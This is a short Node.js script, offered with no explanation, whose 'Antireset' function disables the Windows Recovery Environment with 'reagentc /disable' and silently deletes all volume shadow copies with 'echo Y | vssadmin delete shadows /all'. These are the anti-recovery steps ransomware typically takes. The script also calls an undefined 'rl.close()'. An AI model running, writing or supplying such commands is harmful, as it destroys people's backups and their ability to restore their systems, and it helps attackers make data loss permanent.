const { exec } = require('child_process');


function executeCommand(command, description) {
  return new Promise((resolve, reject) => {
    console.log(`\n${description}...`);
    console.log(`Executing: ${command}`);
    
    exec(command, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${error.message}`);
        reject(error);
        return;
      }
      if (stderr) {
        console.error(`Stderr: ${stderr}`);
      }
      if (stdout) {
        console.log(`Output: ${stdout}`);
      }
      resolve(stdout);
    });
  });
}

async function Antireset() {
  try {
    
    await executeCommand('reagentc /disable');
    
    await executeCommand('echo Y | vssadmin delete shadows /all', 'Deleting all shadow copies');
    
    
  } catch (error) {
    console.error('\n❌ Operation failed:', error.message);
  } finally {
    rl.close();
  }
}

if (process.platform !== 'win32') {
  console.error('This script can only run on Windows systems.');
  process.exit(1);
}

Antireset();
